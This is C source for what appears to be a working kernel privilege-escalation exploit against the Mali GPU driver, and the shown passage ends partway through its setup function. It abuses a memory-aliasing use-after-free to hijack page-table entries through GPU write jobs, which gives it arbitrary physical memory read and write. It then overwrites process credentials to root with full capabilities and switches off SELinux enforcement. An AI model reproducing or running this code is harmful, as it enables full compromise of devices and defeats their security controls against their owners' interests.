#include <stdio.h>
#include <stdarg.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/wait.h>

#define PAGE_SHIFT 12
#define CHUNK_SIZE (2UL << 20)
#define CHUNKS 15360UL
#define NATIVE_SIZE (32UL << 20)

struct kbase_ioctl_version_check { uint16_t major; uint16_t minor; };
struct kbase_ioctl_set_flags { uint32_t create_flags; };
union kbase_ioctl_mem_alloc {
    struct { uint64_t va_pages; uint64_t commit_pages; uint64_t extent; uint64_t flags; } in;
    struct { uint64_t flags; uint64_t gpu_va; } out;
};
union kbase_ioctl_mem_alias {
    struct { uint64_t flags; uint64_t stride; uint64_t nents; uint64_t aliasing_info; } in;
    struct { uint64_t flags; uint64_t gpu_va; uint64_t va_pages; } out;
};
struct base_mem_handle { struct { uint64_t handle; } basep; };
struct base_mem_aliasing_info { struct base_mem_handle handle; uint64_t offset; uint64_t length; };
struct kbase_ioctl_mem_flags_change { uint64_t gpu_va; uint64_t flags; uint64_t mask; };
struct kbase_ioctl_job_submit { uint64_t addr; uint32_t nr_atoms; uint32_t stride; };
struct base_dependency { uint8_t atom_id; uint8_t dependency_type; };
struct base_jd_atom_v2 {
    uint64_t jc; uint64_t udata[2]; uint64_t extres_list;
    uint16_t nr_extres; uint16_t compat_core_req;
    struct base_dependency pre_dep[2];
    uint8_t atom_number, prio, device_nr, padding;
    uint32_t core_req;
};
struct base_jd_event_v2 { uint32_t event_code; uint8_t atom_number; uint8_t _pad[3]; uint64_t udata[2]; };

#define BASE_MEM_MAP_TRACKING_HANDLE (3ull << 12)
#define BASE_MEM_PROT_CPU_RD (1ull << 0)
#define BASE_MEM_PROT_CPU_WR (1ull << 1)
#define BASE_MEM_PROT_GPU_RD (1ull << 2)
#define BASE_MEM_PROT_GPU_WR (1ull << 3)
#define BASE_MEM_SAME_VA (1ull << 13)
#define BASE_MEM_DONT_NEED (1ull << 17)
#define BASE_MEM_COHERENT_SYSTEM (1ull << 10)
#define BASE_MEM_COHERENT_LOCAL (1ull << 11)
#define BASE_MEM_FLAGS_MODIFIABLE (BASE_MEM_DONT_NEED | BASE_MEM_COHERENT_SYSTEM | BASE_MEM_COHERENT_LOCAL)

#define KBASE_IOCTL_TYPE 0x80
#define KBASE_IOCTL_VERSION_CHECK _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)
#define KBASE_IOCTL_SET_FLAGS _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
#define KBASE_IOCTL_JOB_SUBMIT _IOW(KBASE_IOCTL_TYPE, 2, struct kbase_ioctl_job_submit)
#define KBASE_IOCTL_MEM_ALLOC _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)
#define KBASE_IOCTL_MEM_ALIAS _IOWR(KBASE_IOCTL_TYPE, 21, union kbase_ioctl_mem_alias)
#define KBASE_IOCTL_MEM_FLAGS_CHANGE _IOW(KBASE_IOCTL_TYPE, 23, struct kbase_ioctl_mem_flags_change)

#define PTE_ADDR_MASK ((1ULL << 48) - 1)
#define MARKER(i) (0x5054450000000000ULL | (uint64_t)(i))
#define THRASH_SIZE (96UL << 20)

#define KPHYS_BASE 0x80080000ULL

#define IMAGE_VA   0xffffff8008080000ULL
#define IMAGE_PHYS 0x80080000ULL
#define PAGE_OFF   0xffffffc000000000ULL
#define MEMSTART   0x80000000ULL

#define INIT_TASK_VA      0xffffff8009721780ULL
#define INIT_CRED_VA      0xffffff800972c0c0ULL
#define SELINUX_STATE_VA  0xffffff80099dbcc8ULL

#define T_TASKS      0x4d8ULL
#define T_REAL_PARENT 0x5e8ULL
#define T_REAL_CRED  0x780ULL
#define T_CRED       0x788ULL
#define T_COMM       0x790ULL

#define C_UID        0x04ULL
#define C_GID        0x08ULL
#define C_SUID       0x0cULL
#define C_SGID       0x10ULL
#define C_EUID       0x14ULL
#define C_EGID       0x18ULL
#define C_FSUID      0x1cULL
#define C_FSGID      0x20ULL
#define C_SECUREBITS 0x24ULL
#define C_CAP_INH    0x28ULL
#define C_CAP_PERM   0x30ULL
#define C_CAP_EFF    0x38ULL
#define C_CAP_BSET   0x40ULL
#define C_CAP_AMB    0x48ULL
#define C_USER       0x80ULL
#define C_USER_NS    0x88ULL

#define MAXSLOT 4096

/* physical address of the kernel image */
static uint64_t g_memstart = MEMSTART;
/* Span of the linear map above PAGE_OFF (and above memstart_addr in physical
 * space).  MemTotal excludes reserved regions, so the real span is larger:
 * round MemTotal up to a power of two (3.44 GiB -> 4 GiB here, which matches
 * the live credentials observed at linear offsets near 0xF9D3AE40). */
static uint64_t g_ramsize = 0x100000000ULL;

/* A physical address is only usable if it lies inside real RAM. */
static int phys_ok(uint64_t phys) {
    return phys >= g_memstart && phys < g_memstart + g_ramsize;
}

/* A kernel virtual address is plausible if it points into the kernel image
 * or into the linear map of RAM. vmalloc addresses are rejected because
 * they are not linearly mapped and would translate to a bogus physical page. */
static int kva_ok(uint64_t va) {
    if (va >= IMAGE_VA && va < IMAGE_VA + 0x2000000ULL) return 1;
    if (va >= PAGE_OFF && va < PAGE_OFF + g_ramsize) return 1;
    return 0;
}

static int logfd = -1;
static void logmsg(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n > 0) { write(1, buf, n); if (logfd >= 0) { write(logfd, buf, n); fsync(logfd); } }
}
static void crash_handler(int sig, siginfo_t *si, void *ctx) {
    (void)ctx;
    logmsg("[!] signal %d addr=%p\n", sig, si->si_addr);
    _exit(128 + sig);
}

static int fd;
static void *jc_page;
static unsigned char *thrash_buf;
static void *g_native;
static void *g_raw;
static size_t g_raw_len;

static void thrash(void) {
    volatile unsigned char sink = 0;
    for (size_t i = 0; i < THRASH_SIZE; i += 64) sink ^= thrash_buf[i];
    if (sink == 0xff) logmsg("[i] thrash sink weird\n");
}

static void *map_gpu(unsigned pages) {
    union kbase_ioctl_mem_alloc ma;
    memset(&ma, 0, sizeof(ma));
    ma.in.flags = BASE_MEM_SAME_VA | BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    ma.in.va_pages = pages;
    ma.in.commit_pages = pages;
    if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &ma) < 0) { logmsg("[-] alloc: %s\n", strerror(errno)); return NULL; }
    void *r = mmap(NULL, pages << 12, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ma.out.gpu_va);
    if (r == MAP_FAILED) { logmsg("[-] mmap: %s\n", strerror(errno)); return NULL; }
    return r;
}

static void pack_header(uint32_t *cl, uint32_t type, uint64_t next) {
    cl[0]=0; cl[1]=0; cl[2]=0; cl[3]=0;
    cl[4] = 1 | (type << 1);
    cl[5] = 0;
    cl[6] = (uint32_t)next; cl[7] = (uint32_t)(next >> 32);
}
struct write_value_payload { uint64_t address, type, immediate_value; };

static uint32_t submit_write(uint64_t target_va, uint64_t value) {
    if (!jc_page) { jc_page = map_gpu(1); if (!jc_page) return 0xffffffffu; }
    void *jc = jc_page;
    memset(jc, 0, 0x1000);
    pack_header((uint32_t *)jc, 2, 0);
    struct write_value_payload pl = { target_va, 7, value };
    memcpy((uint32_t *)jc + 8, &pl, sizeof(pl));
    struct base_jd_atom_v2 atom;
    memset(&atom, 0, sizeof(atom));
    atom.jc = (uint64_t)jc;
    atom.atom_number = 1;
    atom.core_req = 0x2;
    struct kbase_ioctl_job_submit js = { (uint64_t)&atom, 1, sizeof(atom) };
    if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &js) < 0) { logmsg("[-] submit: %s\n", strerror(errno)); return 0xfffffffeu; }
    struct pollfd pfd = { fd, POLLIN, 0 };
    if (poll(&pfd, 1, 3000) <= 0) { logmsg("[-] poll timeout\n"); return 0xffffffddu; }
    struct base_jd_event_v2 ev;
    if (read(fd, &ev, sizeof(ev)) < (int)sizeof(ev)) { logmsg("[-] event read\n"); return 0xfffffffcu; }
    return ev.event_code;
}

struct cand {
    size_t pg;
    uint64_t idx;
    uint64_t high, low;
    uint64_t a_val;
    uint64_t b_val;
    uint64_t alias_page;
    unsigned char *chunk_va;
    int la, lb;
    int a_slot, b_slot;
    int probe_slot;
    uint64_t probe_val;
    int used_slot[64];
    uint64_t used_val[64];
    int nused;
    int lines[64];
    int nf;
    int cursor;
};

struct slot { uint64_t alias_page; int L, j; unsigned char *va; };
static struct slot slots[MAXSLOT];
static int nslot = 0;

static struct cand cur;
static int have_cand = 0;
static int used_pg[(32UL << 20) >> 12];
static size_t scan_pg = 0;
static void *alias_ro;
static unsigned char *chunk_base;

static int cleanup_line(uint64_t alias_page, int L);

/* The candidate page must still hold exactly: A, B, the (optional) probe
 * entry and every hijack entry we already wrote - no more, no less, and
 * each at its expected value.  Anything else means the page has been
 * reclaimed/reused underneath us and must not be written again. */
static int pattern_still_live(void) {
    uint64_t *e = (uint64_t *)((char *)alias_ro + (cur.pg << 12));
    if (e[cur.a_slot] != cur.a_val) return 0;
    if (e[cur.b_slot] != cur.b_val) return 0;
    if (cur.probe_slot >= 0 && e[cur.probe_slot] != cur.probe_val) return 0;
    int nz = 0, expect = 2 + (cur.probe_slot >= 0 ? 1 : 0) + cur.nused;
    for (int s = 0; s < 512; s++) {
        uint64_t v = e[s];
        if (!v) continue;
        nz++;
        if (s == cur.a_slot || s == cur.b_slot || s == cur.probe_slot) continue;
        int ok = 0;
        for (int u = 0; u < cur.nused; u++)
            if (cur.used_slot[u] == s) { ok = (cur.used_val[u] == v); break; }
        if (!ok) return 0;
    }
    return nz == expect;
}

/* Prove a candidate PTE page is really the live page-table page backing our
 * chunk mapping *before* any GPU write touches it.
 *
 * Trick: fault in one untouched page (the "probe") through our own CPU mapping
 * of chunk idx.  If the candidate page is the live PTE page for that chunk,
 * the kernel itself writes a fresh entry at the probe slot, visible through
 * the alias; if it is a stale/reused page, the fault allocates a new page
 * table elsewhere and the candidate simply does not change.  We never write
 * to the candidate ourselves, so a false candidate is left completely intact.
 *
 * The probe line is removed from the hijack line list so cleanup never
 * touches the probe entry (which is a real kernel-managed PTE). */
static int validate_candidate_readonly(void) {
    uint64_t *e = (uint64_t *)((char *)alias_ro + (cur.pg << 12));

    /* pick a probe slot: in a free line, second-or-later slot so the line
     * stays usable for hijack at slot L*8, and currently empty */
    int probe = -1;
    for (int i = 0; i < cur.nf && probe < 0; i++) {
        int L = cur.lines[i];
        for (int j = 1; j < 8; j++)
            if (e[L * 8 + j] == 0) { probe = L * 8 + j; break; }
    }
    if (probe < 0) { logmsg("[-] no empty probe slot\n"); return 0; }
    int Lp = probe >> 3;

    /* remove the probe line from the hijack list */
    int w = 0;
    for (int i = 0; i < cur.nf; i++)
        if (cur.lines[i] != Lp) cur.lines[w++] = cur.lines[i];
    cur.nf = w;

    /* snapshot: count nonzero entries, remember A/B values and probe line */
    int nz0 = 0;
    for (int s = 0; s < 512; s++) if (e[s]) nz0++;
    if (nz0 != 2) return 0;
    uint64_t a_snap = e[cur.a_slot], b_snap = e[cur.b_slot];

    /* fault the probe page in via the normal CPU mapping */
    volatile unsigned char *pva = cur.chunk_va + (size_t)probe * 0x1000;
    unsigned char c = *pva; (void)c;
    thrash();

    uint64_t pv = e[probe];
    int nz1 = 0;
    for (int s = 0; s < 512; s++) {
        uint64_t v = e[s];
        if (!v || s == cur.a_slot || s == cur.b_slot) continue;
        if (++nz1 > 1) { logmsg("[-] validate: >1 new entry at pg=0x%zx\n", cur.pg << 12); return 0; }
        if (s != probe) { logmsg("[-] validate: new entry at wrong slot %d\n", s); return 0; }
    }
    if (e[cur.a_slot] != a_snap || e[cur.b_slot] != b_snap) {
        logmsg("[-] validate: A/B changed (%llx->%llx / %llx->%llx)\n",
               (unsigned long long)a_snap, (unsigned long long)e[cur.a_slot],
               (unsigned long long)b_snap, (unsigned long long)e[cur.b_slot]);
        return 0;
    }
    if (!pv) { logmsg("[-] validate: probe entry absent (stale page)\n"); return 0; }
    if ((pv & 0x3) != 0x3) { logmsg("[-] validate: probe not present\n"); return 0; }
    uint64_t padr = pv & PTE_ADDR_MASK & ~0xfffULL;
    if (!phys_ok(padr)) { logmsg("[-] validate: probe phys %llx outside RAM\n", (unsigned long long)padr); return 0; }
    uint64_t aadr = a_snap & PTE_ADDR_MASK & ~0xfffULL;
    if (padr == aadr) { logmsg("[-] validate: probe maps chunk A page?\n"); return 0; }

    cur.probe_slot = probe;
    cur.probe_val = pv;
    logmsg("[+] validated pg=0x%zx probe=%d pte=%llx (live PTE page confirmed)\n",
           cur.pg << 12, probe, (unsigned long long)pv);
    return 1;
}

static int verify_candidate(void) {
    if (cur.cursor >= cur.nf) return 0;
    int L = cur.lines[cur.cursor++];
    if (!pattern_still_live()) { cleanup_line(cur.alias_page, L); return 0; }
    uint64_t phys_a = cur.a_val & ~0xfffULL;
    uint64_t pte = cur.high | phys_a | cur.low;
    if (submit_write(cur.alias_page + (size_t)(L * 8) * 8, pte) != 1) { cleanup_line(cur.alias_page, L); return 0; }
    thrash();
    if (((uint64_t *)cur.alias_page)[L * 8] != pte) { cleanup_line(cur.alias_page, L); return 0; }
    unsigned char *va = cur.chunk_va + (size_t)(L * 8) * 0x1000;
    uint64_t content = *(volatile uint64_t *)va;
    if (content != MARKER(cur.idx)) {
        logmsg("[-] cand pg=0x%zx idx=%llu marker mismatch got=%llx\n",
               cur.pg << 12, (unsigned long long)cur.idx, (unsigned long long)content);
        cleanup_line(cur.alias_page, L);
        return 0;
    }
    if (cur.nused < 64) { cur.used_slot[cur.nused] = L * 8; cur.used_val[cur.nused] = pte; cur.nused++; }
    struct slot *s = &slots[nslot++];
    s->alias_page = cur.alias_page;
    s->L = L; s->j = 0;
    s->va = va;
    return 1;
}

static int find_candidate(void) {
    for (; scan_pg < ((32UL << 20) >> 12); scan_pg++) {
        size_t pg = scan_pg;
        if (used_pg[pg]) continue;
        uint64_t *e = (uint64_t *)((char *)alias_ro + (pg << 12));
        int nz = 0, s0 = -1, s1 = -1, bad = 0;
        for (int s = 0; s < 512; s++) {
            uint64_t v = e[s];
            if (!v) continue;
            nz++;
            if (nz > 2) { bad = 1; break; }
            if (s0 < 0) s0 = s; else s1 = s;
        }
        if (bad || nz != 2) continue;
        uint64_t v0 = e[s0], v1 = e[s1];
        if ((v0 & 0x3) != 0x3 || (v1 & 0x3) != 0x3) continue;
        unsigned a_slot, b_slot;
        if (s0 >= 32 && s1 < 32) { a_slot = s0; b_slot = s1; }
        else if (s1 >= 32 && s0 < 32) { a_slot = s1; b_slot = s0; }
        else continue;
        uint64_t idx = (uint64_t)b_slot * 480 + (a_slot - 32);
        if (idx >= CHUNKS) continue;
        uint64_t a_val = (s0 == (int)a_slot) ? v0 : v1;
        uint64_t b_val = (s0 == (int)a_slot) ? v1 : v0;
        if (!phys_ok(b_val & PTE_ADDR_MASK & ~0xfffULL)) continue;
        /* A and B are both user-anon PTEs of the same VMA written by the CPU:
         * their flag bits (low 12 bits and bits above 48) must be identical */
        if ((a_val & ~PTE_ADDR_MASK) != (b_val & ~PTE_ADDR_MASK) ||
            (a_val & 0xfffULL) != (b_val & 0xfffULL)) {
            logmsg("[-] skip pg=0x%zx: A/B flags differ a=%llx b=%llx\n",
                   pg << 12, (unsigned long long)a_val, (unsigned long long)b_val);
            continue;
        }
        used_pg[pg] = 1;
        memset(&cur, 0, sizeof(cur));
        cur.pg = pg;
        cur.idx = idx;
        cur.high = a_val & ~PTE_ADDR_MASK;
        cur.low = a_val & 0xfffULL;
        cur.a_val = a_val;
        cur.b_val = b_val;
        cur.alias_page = (uint64_t)alias_ro + (pg << 12);
        cur.chunk_va = chunk_base + idx * CHUNK_SIZE;
        cur.la = (int)(a_slot >> 3);
        cur.lb = (int)(b_slot >> 3);
        cur.a_slot = (int)a_slot;
        cur.b_slot = (int)b_slot;
        cur.probe_slot = -1;
        for (int L = 0; L < 64; L++) if (L != cur.la && L != cur.lb) cur.lines[cur.nf++] = L;
        cur.cursor = 0;
        if (!validate_candidate_readonly()) { used_pg[pg] = 0; continue; }
        used_pg[pg] = 1;
        if (!verify_candidate()) continue;
        have_cand = 1;
        logmsg("[+] cand pg=0x%zx i=%llu slots=%u/%u lines=%d/%d high=0x%llx low=0x%llx\n",
               pg << 12, (unsigned long long)idx, a_slot, b_slot, cur.la, cur.lb,
               (unsigned long long)cur.high, (unsigned long long)cur.low);
        scan_pg++;
        return 1;
    }
    return 0;
}

static int cleanup_line(uint64_t alias_page, int L) {
    for (int attempt = 0; attempt < 10; attempt++) {
        thrash();
        for (int j = 0; j < 8; j++) submit_write(alias_page + (size_t)(L * 8 + j) * 8, 0);
        uint64_t *ep = (uint64_t *)alias_page;
        int ok = 1;
        for (int j = 0; j < 8; j++) if (ep[L * 8 + j] != 0) { ok = 0; break; }
        if (ok) { thrash(); return 1; }
    }
    logmsg("[!] cleanup FAILED line %d\n", L);
    return 0;
}

static struct slot *slot_alloc(uint64_t phys) {
    if (nslot >= MAXSLOT) return NULL;
    if (!phys_ok(phys)) {
        logmsg("[-] slot_alloc: phys %llx outside RAM [0x%llx,0x%llx), refusing\n",
               (unsigned long long)phys, (unsigned long long)g_memstart,
               (unsigned long long)(g_memstart + g_ramsize));
        return NULL;
    }
    for (int attempt = 0; attempt < 6; attempt++) {
        if (!have_cand || cur.cursor >= cur.nf) {
            have_cand = 0;
            if (!find_candidate()) { logmsg("[-] no more candidates\n"); return NULL; }
        }
        int L = cur.lines[cur.cursor++];
        if (!pattern_still_live()) { logmsg("[-] cand gone live (race)\n"); cleanup_line(cur.alias_page, L); continue; }
        uint64_t pte = cur.high | (phys & ~0xfffULL) | cur.low;
        uint32_t ev = submit_write(cur.alias_page + (size_t)(L * 8) * 8, pte);
        if (ev != 1) { logmsg("[-] pte write ev=0x%x (retry %d)\n", ev, attempt); cleanup_line(cur.alias_page, L); continue; }
        thrash();
        if (((uint64_t *)cur.alias_page)[L * 8] != pte) { logmsg("[-] pte verify fail (retry %d)\n", attempt); cleanup_line(cur.alias_page, L); continue; }
        if (cur.nused < 64) { cur.used_slot[cur.nused] = L * 8; cur.used_val[cur.nused] = pte; cur.nused++; }
        struct slot *s = &slots[nslot++];
        s->alias_page = cur.alias_page;
        s->L = L; s->j = 0;
        s->va = cur.chunk_va + (size_t)(L * 8) * 0x1000;
        return s;
    }
    logmsg("[-] slot_alloc exhausted for phys %llx\n", (unsigned long long)phys);
    return NULL;
}

static void slot_release(struct slot *s) {
    if (s->alias_page == cur.alias_page) {
        int slot = s->L * 8, w = 0;
        for (int u = 0; u < cur.nused; u++) {
            if (cur.used_slot[u] == slot) continue;
            cur.used_slot[w] = cur.used_slot[u];
            cur.used_val[w] = cur.used_val[u];
            w++;
        }
        cur.nused = w;
    }
    cleanup_line(s->alias_page, s->L);
}

static uint64_t va_to_phys(uint64_t va) {
    if (va >= PAGE_OFF) return va - PAGE_OFF + g_memstart;
    return va - IMAGE_VA + IMAGE_PHYS;
}

static int phys_read(uint64_t va, void *buf, size_t len) {
    uint64_t p0 = va & ~0xfffULL, p1 = (va + len - 1) & ~0xfffULL;
    if (p1 - p0 != 0 && p1 - p0 != 0x1000) { logmsg("[-] span too big\n"); return -1; }
    struct slot *s = slot_alloc(va_to_phys(p0));
    if (!s) return -1;
    size_t off = va - p0;
    if (p0 == p1) {
        memcpy(buf, s->va + off, len);
    } else {
        size_t first = 0x1000 - off;
        memcpy(buf, s->va + off, first);
        struct slot *s2 = slot_alloc(va_to_phys(p1));
        if (!s2) { slot_release(s); return -1; }
        memcpy((char *)buf + first, s2->va, len - first);
    }
    return 0;
}

static int phys_write(uint64_t va, const void *buf, size_t len) {
    uint64_t p0 = va & ~0xfffULL, p1 = (va + len - 1) & ~0xfffULL;
    if (p1 - p0 != 0 && p1 - p0 != 0x1000) { logmsg("[-] span too big\n"); return -1; }
    struct slot *s = slot_alloc(va_to_phys(p0));
    if (!s) return -1;
    size_t off = va - p0;
    if (p0 == p1) {
        memcpy(s->va + off, buf, len);
    } else {
        size_t first = 0x1000 - off;
        memcpy(s->va + off, buf, first);
        struct slot *s2 = slot_alloc(va_to_phys(p1));
        if (!s2) { slot_release(s); return -1; }
        memcpy(s2->va, (const char *)buf + first, len - first);
    }
    return 0;
}

static void release_all(void) {
    for (int i = 0; i < nslot; i++) slot_release(&slots[i]);
    nslot = 0;
    thrash();
}

static unsigned char *pressure_buf;
static size_t pressure_size = 128UL << 20;
#define PRESS_SLOT (64UL << 20)
static unsigned char *press[24];
static size_t press_sz[24];
static int npress = 0;

static long mem_available_kb(void) {
    int f = open("/proc/meminfo", O_RDONLY);
    if (f < 0) return -1;
    char b[4096];
    ssize_t n = read(f, b, sizeof(b) - 1);
    close(f);
    if (n <= 0) return -1;
    b[n] = 0;
    char *p = strstr(b, "MemAvailable:");
    if (!p) return -1;
    return strtol(p + 13, NULL, 10);
}

static long mem_free_kb(void) {
    int f = open("/proc/meminfo", O_RDONLY);
    if (f < 0) return -1;
    char b[4096];
    ssize_t n = read(f, b, sizeof(b) - 1);
    close(f);
    if (n <= 0) return -1;
    b[n] = 0;
    char *p = strstr(b, "MemFree:");
    if (!p) return -1;
    return strtol(p + 8, NULL, 10);
}

static void log_mem(const char *tag) {
    int f = open("/proc/meminfo", O_RDONLY);
    if (f < 0) return;
    char b[4096];
    ssize_t n = read(f, b, sizeof(b) - 1);
    close(f);
    if (n <= 0) return;
    b[n] = 0;
    char *p = strstr(b, "MemAvailable:");
    if (p) {
        char *e = strchr(p, '\n');
        if (e) *e = 0;
        logmsg("[i] %s %s", tag, p);
    }
    p = strstr(b, "MemFree:");
    if (p) {
        char *e = strchr(p, '\n');
        if (e) *e = 0;
        logmsg(" | %s\n", p);
    }
}

static int pressure_new(size_t sz) {
    if (npress >= 24) return -1;
    long avail = mem_available_kb();
    if (avail > 0 && avail < 350 * 1024) { logmsg("[-] avail=%ld kB too low, stop pressure\n", avail); return -1; }
    unsigned char *p = mmap(NULL, sz, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
    if (p == MAP_FAILED) return -1;
    for (size_t o = 0; o < sz; o += 4096) p[o] = (unsigned char)npress;
    press[npress] = p;
    press_sz[npress] = sz;
    npress++;
    return 0;
}

/* The kbase shrinker only evicts DONT_NEED pages while the kernel is really
 * reclaiming memory.  After boot MemFree sits near zero and that is exactly
 * when the exploit works; once the system settles (MemFree ~600 MB) the
 * shrinker never runs.  So drive MemFree down to the watermark first. */
static void pressure_fill(void) {
    long mf = mem_free_kb(), ma = mem_available_kb();
    logmsg("[i] pressure_fill start npress=%d free=%ldkB avail=%ldkB\n", npress, mf, ma);
    while (npress < 24 && mf > 80 * 1024 && ma > 350 * 1024) {
        if (pressure_new(PRESS_SLOT) < 0) break;
        mf = mem_free_kb(); ma = mem_available_kb();
        logmsg("[i]  press=%d free=%ldkB avail=%ldkB\n", npress, mf, ma);
    }
}
static void release_pressure(void) {
    for (int i = 0; i < npress; i++) munmap(press[i], press_sz[i]);
    npress = 0;
    if (pressure_buf) { munmap(pressure_buf, pressure_size); pressure_buf = NULL; }
    long avail = mem_available_kb();
    if (avail > 0) logmsg("[i] released pressure, avail=%ld kB\n", avail);
}

static void spray_chunks(size_t start, size_t count) {
    for (size_t k = 0; k < count; k++) {
        size_t i = start + k;
        if (i >= CHUNKS) break;
        unsigned slot_a = 32 + (unsigned)(i % 480);
        unsigned slot_b = (unsigned)((i / 480) % 32);
        unsigned char *p = chunk_base + i * CHUNK_SIZE;
        *(volatile uint64_t *)(p + (size_t)slot_a * 0x1000) = MARKER(i);
        *(volatile uint64_t *)(p + (size_t)slot_b * 0x1000) = MARKER(i) ^ 0x1111111111111111ULL;
    }
}

static int comm_valid(const char *c) {
    int seen = 0;
    for (int i = 0; i < 16; i++) {
        unsigned char ch = (unsigned char)c[i];
        if (ch == 0) break;
        if (ch < 0x20 || ch > 0x7e) return 0;
        seen = 1;
    }
    return seen;
}

static int read_task_comm(uint64_t task_va, char *out) {
    unsigned char buf[16];
    if (phys_read(task_va + T_COMM, buf, 16) < 0) return -1;
    memcpy(out, buf, 16);
    out[15] = 0;
    return 0;
}

static int read_u64(uint64_t va, uint64_t *out) {
    return phys_read(va, out, 8);
}
static int read_u32(uint64_t va, uint32_t *out) {
    return phys_read(va, out, 4);
}

static int patch_cred(uint64_t cred_va) {
    uint32_t v;
    if (read_u32(cred_va + C_UID, &v) < 0) return -1;
    logmsg("[i] cred %llx uid=%u gid=%u\n", (unsigned long long)cred_va, v, 0);
    uint32_t gid, euid, egid, fsuid;
    read_u32(cred_va + C_GID, &gid);
    read_u32(cred_va + C_EUID, &euid);
    read_u32(cred_va + C_EGID, &egid);
    read_u32(cred_va + C_FSUID, &fsuid);
    logmsg("[i] cred gid=%u euid=%u egid=%u fsuid=%u\n", gid, euid, egid, fsuid);
    if (v != 2000 && v != 0) { logmsg("[-] unexpected uid %u, abort\n", v); return -1; }
    if (v == 0) { logmsg("[i] already root\n"); return 0; }
    uint32_t z = 0;
    uint64_t caps = 0x3fffffffffULL;
    if (phys_write(cred_va + C_UID, &z, 4) < 0) return -1;
    if (phys_write(cred_va + C_GID, &z, 4) < 0) return -1;
    if (phys_write(cred_va + C_SUID, &z, 4) < 0) return -1;
    if (phys_write(cred_va + C_SGID, &z, 4) < 0) return -1;
    if (phys_write(cred_va + C_EUID, &z, 4) < 0) return -1;
    if (phys_write(cred_va + C_EGID, &z, 4) < 0) return -1;
    if (phys_write(cred_va + C_FSUID, &z, 4) < 0) return -1;
    if (phys_write(cred_va + C_FSGID, &z, 4) < 0) return -1;
    if (phys_write(cred_va + C_SECUREBITS, &z, 4) < 0) return -1;
    if (phys_write(cred_va + C_CAP_INH, &caps, 8) < 0) return -1;
    if (phys_write(cred_va + C_CAP_PERM, &caps, 8) < 0) return -1;
    if (phys_write(cred_va + C_CAP_EFF, &caps, 8) < 0) return -1;
    if (phys_write(cred_va + C_CAP_BSET, &caps, 8) < 0) return -1;
    uint32_t vu = 0, vg = 0;
    read_u32(cred_va + C_UID, &vu);
    read_u32(cred_va + C_GID, &vg);
    uint64_t veff = 0;
    read_u64(cred_va + C_CAP_EFF, &veff);
    logmsg("[+] cred patched (readback uid=%u gid=%u cap_eff=%llx)\n", vu, vg, (unsigned long long)veff);
    return 0;
}

static int patch_selinux(void) {
    unsigned char page[16];
    if (phys_read(SELINUX_STATE_VA, page, 4) < 0) return -1;
    logmsg("[i] selinux_state bytes: %02x %02x %02x %02x\n", page[0], page[1], page[2], page[3]);
    if (page[1] != 1) { logmsg("[!] enforcing byte != 1 at +1; not patching\n"); return -1; }
    unsigned char z = 0;
    if (phys_write(SELINUX_STATE_VA + 1, &z, 1) < 0) return -1;
    unsigned char chk[4];
    phys_read(SELINUX_STATE_VA, chk, 4);
    logmsg("[+] selinux enforcing now: %02x %02x %02x %02x\n", chk[0], chk[1], chk[2], chk[3]);
    return 0;
}

/* One arming attempt: fresh kbase context, fresh 32 MB native allocation,
 * fresh alias (UAF window), then pressure + chunk spray to try to reclaim
 * the freed pages as our own chunk page-table pages.  Returns 1 with a
 * validated candidate and all mappings live, 0 on failure (caller must
 * disarm). */
static int arm_and_find(void) {
    fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) { logmsg("[-] open: %s\n", strerror(errno)); return 0; }
    struct kbase_ioctl_version_check vc = { 999, 999 };
    ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc);
    struct kbase_ioctl_set_flags sf = { 0 };
    if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf) < 0) { logmsg("[-] setflags: %s\n", strerror(errno)); return 0; }
    mmap(NULL, NATIVE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);

    void *native = map_gpu(NATIVE_SIZE >> PAGE_SHIFT);
    if (!native) return 0;
    g_native = native;
    for (size_t o = 0; o < NATIVE_SIZE; o += 0x1000) *(volatile uint64_t *)((char *)native + o) = 0x5a5a000000000000ULL | (o >> 12);

    union kbase_ioctl_mem_alias al;
    struct base_mem_aliasing_info ai;
    memset(&al, 0, sizeof(al)); memset(&ai, 0, sizeof(ai));
    al.in.nents = 1;
    al.in.stride = NATIVE_SIZE >> PAGE_SHIFT;
    al.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    ai.handle.basep.handle = (uint64_t)native;
    ai.length = NATIVE_SIZE >> PAGE_SHIFT;
    al.in.aliasing_info = (uint64_t)&ai;
    if (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, &al) < 0) { logmsg("[-] alias: %s\n", strerror(errno)); return 0; }

    struct kbase_ioctl_mem_flags_change fc;
    fc.gpu_va = (uint64_t)native;
    fc.mask = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
    fc.flags = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
    if (ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &fc) < 0) { logmsg("[-] flags_change: %s\n", strerror(errno)); return 0; }

    alias_ro = mmap(NULL, NATIVE_SIZE, PROT_READ, MAP_SHARED, fd, al.out.gpu_va);
    if (alias_ro == MAP_FAILED) { logmsg("[-] alias mmap: %s\n", strerror(errno)); alias_ro = NULL; return 0; }
